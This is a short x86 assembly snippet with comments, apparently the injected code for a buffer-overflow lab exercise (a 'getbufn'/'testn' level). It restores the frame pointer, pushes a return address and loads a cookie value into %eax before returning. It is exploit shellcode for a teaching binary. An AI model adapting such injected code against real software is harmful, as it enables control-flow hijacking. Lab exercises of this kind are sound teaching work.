lea     0x28(%esp),%ebp    # restore ebp register contents 
pushl 	$0x08048e15        #return address points testn in getbufn call after an instruction 
movl 	$0x4c6ace54,% eax  # returns the cookie value 
ret                        # Back testn continue
